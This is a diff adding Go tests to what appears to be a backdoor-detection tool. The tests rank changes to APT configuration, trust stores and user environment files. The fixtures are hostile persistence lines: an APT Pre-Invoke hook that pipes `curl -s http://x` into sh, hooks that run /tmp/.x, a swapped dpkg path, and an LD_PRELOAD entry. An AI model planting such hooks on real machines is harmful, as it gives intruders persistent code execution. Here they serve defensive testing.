@@ -309,3 +309,79 @@ func TestJudgeBootImageAfterRolledKernelUpdate(t *testing.T) {
 		_ = name
 	}
 }
+
+func aptConf(p string, lines ...string) model.PersistFile {
+	return model.PersistFile{Path: p, Kind: model.PersistKindAptConf, Mode: 0o100644, SHA256: h(strings.Join(lines, "\n")), Lines: lines, MTime: changed}
+}
+
+// /etc/apt/apt.conf.d: maintainer scripts rewrite 20auto-upgrades and
+// 50unattended-upgrades through ucf, which no package owns. A change there
+// is a backdoor sign only when the file now holds something APT or dpkg
+// runs (an Invoke hook, Pre-Install-Pkgs) or a replaced program
+// (Dir::Bin); anything else is a note.
+func TestJudgeAptConfRankedByContent(t *testing.T) {
+	const auto = "/etc/apt/apt.conf.d/20auto-upgrades"
+	old := clean()
+	old.Persist = []model.PersistFile{aptConf(auto, `APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "1";`)}
+	cur := clone(old)
+	cur.Persist = []model.PersistFile{aptConf(auto, `APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "0";`)}
+	f := must(t, run(cur, snapOf(old), nil), "snap.persist:"+auto, model.SevNote)
+	if !strings.Contains(f.Why, "hook") {
+		t.Errorf("why %q", f.Why)
+	}
+	// A new snippet without a hook.
+	added := clone(old)
+	added.Persist = append(added.Persist, aptConf("/etc/apt/apt.conf.d/50unattended-upgrades", `Unattended-Upgrade::Mail "root";`))
+	must(t, run(added, snapOf(old), nil), "snap.persist:/etc/apt/apt.conf.d/50unattended-upgrades", model.SevNote)
+
+	for _, hook := range []string{
+		`DPkg::Post-Invoke { "/tmp/.x"; };`,
+		`DPkg::Pre-Invoke {"curl -s http://x | sh";};`,
+		`APT::Update::Pre-Invoke { "/tmp/.x"; };`,
+		`APT::Update::Post-Invoke-Success { "/tmp/.x"; };`,
+		`DPkg::Pre-Install-Pkgs { "/tmp/.x"; };`,
+		`apt::update::post-invoke { "/tmp/.x"; };`,
+		`Dir::Bin::dpkg "/tmp/dpkg";`,
+		`Dir::Bin::Methods "/tmp/m";`,
+		`Dir { Bin { dpkg "/tmp/dpkg"; }; };`,
+	} {
+		// Added to an existing snippet.
+		c := clone(old)
+		c.Persist = []model.PersistFile{aptConf(auto, `APT::Periodic::Update-Package-Lists "1";`, `APT::Periodic::Unattended-Upgrade "1";`, hook)}
+		must(t, run(c, snapOf(old), nil), "snap.persist:"+auto, model.SevBackdoor)
+		// In a new snippet.
+		c = clone(old)
+		c.Persist = append(c.Persist, aptConf("/etc/apt/apt.conf.d/99zz", hook))
+		must(t, run(c, snapOf(old), nil), "snap.persist:/etc/apt/apt.conf.d/99zz", model.SevBackdoor)
+	}
+	// A hook that was there, with the command under it changed.
+	was := clone(old)
+	was.Persist = []model.PersistFile{aptConf(auto, `DPkg::Post-Invoke {`, `  "/usr/bin/true";`, `};`)}
+	now := clone(old)
+	now.Persist = []model.PersistFile{aptConf(auto, `DPkg::Post-Invoke {`, `  "/tmp/.x";`, `};`)}
+	must(t, run(now, snapOf(was), nil), "snap.persist:"+auto, model.SevBackdoor)
+	// Its text was not kept: nothing says it holds no hook.
+	blind := clone(old)
+	blind.Persist = []model.PersistFile{{Path: auto, Kind: model.PersistKindAptConf, Mode: 0o100644, SHA256: h("big"), MTime: changed}}
+	must(t, run(blind, snapOf(old), nil), "snap.persist:"+auto, model.SevBackdoor)
+}
+
+// More places that decide what is trusted or what every session runs.
+func TestJudgeTrustLocations(t *testing.T) {
+	for _, p := range []string{"/etc/apt/keyrings/x.gpg", "/etc/apt/trusted.gpg", "/etc/apt/sources.list", "/usr/local/share/ca-certificates/x.crt"} {
+		old := clean()
+		cur := clone(old)
+		cur.Files = append(cur.Files, file(p, "planted", 0o644))
+		must(t, run(cur, snapOf(old), nil), "snap.file_added:"+p, model.SevBackdoor)
+		old.Files = append(old.Files, file(p, "as it was", 0o644))
+		must(t, run(cur, snapOf(old), nil), "snap.file_modified:"+p, model.SevBackdoor)
+	}
+	const env = "/home/alice/.config/environment.d/50-x.conf"
+	old := clean()
+	cur := clone(old)
+	cur.Persist = []model.PersistFile{{Path: env, Kind: model.PersistKindUserEnvironment, Mode: 0o100644, SHA256: h("x"), Lines: []string{"LD_PRELOAD=/tmp/.hide.so"}, MTime: changed}}
+	f := must(t, run(cur, snapOf(old), nil), "snap.persist:"+env, model.SevBackdoor)
+	if !strings.Contains(f.Title, "environment") {
+		t.Errorf("title %q", f.Title)
+	}
+}
